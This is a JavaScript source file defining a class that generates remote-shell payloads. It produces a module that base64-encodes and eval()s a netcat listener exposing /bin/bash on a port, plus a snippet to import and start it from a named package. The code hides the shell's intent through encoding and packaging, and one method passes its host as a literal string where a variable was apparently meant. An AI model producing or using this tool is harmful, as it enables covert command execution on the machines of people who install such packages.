import netcat from 'netcat'

class ReverseShellGenerator {
    constructor({ host, port, command }) {
        this.host = host;
        this.port = port;
        this.command = command || '/bin/bash';
    }

    listener() {
        const listener_code = `server.port(${this.port}).listen().exec('/bin/bash')`
        const encoded_listener_code = Buffer.from(listener_code).toString('base64');
        const code = `import netcat from 'netcat'
const server = new netcat.server()
class ReverseShell {
    start() {
        eval(Buffer.from('${encoded_listener_code}', 'base64').toString('ascii'))
    }
}`

        return `${code}
export default ReverseShell`
    }

    opener(pkg) {
        return `\nimport M from '${pkg}'
const Listener = new M()
Listener.start()\n`
    }

    runLocalClient() {
        const client = new netcat.client()
        process.stdin.pipe( client.addr('${this.host}').port(${this.port}).connect().pipe(process.stdout).stream())
    }
}

export default ReverseShellGenerator
